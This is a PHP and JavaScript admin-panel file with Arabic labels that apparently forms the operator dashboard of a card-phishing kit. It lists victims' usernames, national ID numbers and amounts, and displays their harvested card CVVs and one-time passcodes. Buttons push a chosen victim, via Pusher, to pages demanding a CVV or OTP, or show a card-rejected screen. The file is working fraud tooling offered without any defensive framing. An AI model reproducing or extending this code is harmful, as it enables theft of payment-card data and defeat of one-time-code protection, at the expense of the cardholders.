<?php
session_start();
require_once 'init.php';

$users = $User->FetchAllUsersForList();

if ($users != false) :
    foreach ($users as $row) {
?>
    <tr data-user-id="<?= $row->id; ?>">
        <th scope="col"><?= $row->id; ?></th>
        <td><?= htmlspecialchars($row->username); ?></td>
        <td><?= htmlspecialchars($row->ssn); ?></td>
        <td><?= $row->priceCharge ? $row->priceCharge . ' د.ك' : 'غير متوفر'; ?></td>
        <td><?= $row->totalPriceInput ? $row->totalPriceInput . ' د.ك' : 'غير متوفر'; ?></td>
        <td>
            <button class="btn btn-info text-white cardBtn" onclick="removeBackground(this,<?= $row->id; ?>)">card</button>
        </td>
        <td><?= htmlspecialchars($row->last_page) ?: 'غير متوفر'; ?></td>
        <td>
            <?php
            date_default_timezone_set('Asia/Amman');
            $adjusted_time = strtotime($row->created_at . ' +3 hours');
            echo date('Y/m/d - h:i A', $adjusted_time);
            ?>
        </td>
        <td>
            <form action="" method="POST">
                <button type="submit" name="deleteUser" class="btn btn-sm btn-danger" href=""><i class="bi bi-x-lg"></i></button>
                <input type="hidden" name="userId" value="<?= $row->id; ?>">
            </form>

            <div class="modal fade" id="card<?= $row->id; ?>" tabindex="-1" aria-labelledby="cardModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header justify-content-center">
                            <div class="d-flex justify-content-center gap-3 mb-3">
                                <button class="btn btn-danger cvvBtn" style="font-weight: bold;" data-user-id="<?= $row->id; ?>" data-action="cvv">CVV</button>
                                <button class="btn btn-danger otpBtn" style="font-weight: bold;" data-user-id="<?= $row->id; ?>" data-action="otp">OTP</button>
                                <button class="btn btn-danger rejectBtn" style="font-weight: bold;" data-user-id="<?= $row->id; ?>" data-action="reject">رفض بطاقة</button>
                            </div>
                        </div>
                        <div class="modal-body" id="cardDetails<?= $row->id; ?>"></div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
                        </div>
                    </div>
                </div>
            </div>
        </td>
    </tr>
<?php
    }
endif;
?>

<script>
// دالة لجلب بيانات البطاقة وعرضها في نافذة Modal
function removeBackground(button, userId) {
    // إزالة الخلفية إذا لزم الأمر (كما هو موجود في الكود الأصلي)
    button.classList.remove('bg-danger');

    // جلب بيانات البطاقة عبر AJAX
    fetch(`card-list.php?user_id=${userId}`)
        .then(response => response.json())
        .then(data => {
            const cardDetailsDiv = document.getElementById(`cardDetails${userId}`);
            if (data.length > 0) {
                // عرض بيانات البطاقة
                let html = '<ul>';
                data.forEach(card => {
                    html += `<li>Card ID: ${card.id}</li>`;
                    html += `<li>CVV: ${card.cvv || 'غير متوفر'}</li>`;
                    html += `<li>OTP: ${card.otp || 'غير متوفر'}</li>`;
                });
                html += '</ul>';
                cardDetailsDiv.innerHTML = html;
            } else {
                cardDetailsDiv.innerHTML = '<p>لا توجد بيانات بطاقة متاحة.</p>';
            }

            // إظهار نافذة Modal
            const modal = new bootstrap.Modal(document.getElementById(`card${userId}`));
            modal.show();
        })
        .catch(error => {
            console.error('Error fetching card data:', error);
            document.getElementById(`cardDetails${userId}`).innerHTML = '<p>حدث خطأ أثناء جلب البيانات.</p>';
        });
}

// التعامل مع أزرار CVV، OTP، ورفض بطاقة
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('cvvBtn') || e.target.classList.contains('otpBtn') || e.target.classList.contains('rejectBtn')) {
        const userId = e.target.getAttribute('data-user-id');
        const action = e.target.getAttribute('data-action');

        // تحديث الحالة أولاً
        fetch('update-status.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                userId: userId,
                action: action
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // إرسال طلب إعادة التوجيه عبر Pusher
                fetch(`/dashboard/index.php?pusher_redirect=true&user_id=${userId}&action=${action}`)
                    .then(response => response.text())
                    .then(result => {
                        // لا حاجة لإعادة تحميل الصفحة هنا، لأن إعادة التوجيه تتم عبر Pusher
                        console.log('Redirect triggered:', result);
                    })
                    .catch(error => {
                        console.error('Error triggering redirect:', error);
                        alert('حدث خطأ أثناء إعادة التوجيه.');
                    });
            } else {
                alert('حدث خطأ أثناء التحديث: ' + (data.message || 'خطأ غير معروف'));
            }
        })
        .catch(error => {
            console.error('Error updating status:', error);
            alert('حدث خطأ أثناء التحديث.');
        });
    }
});
</script>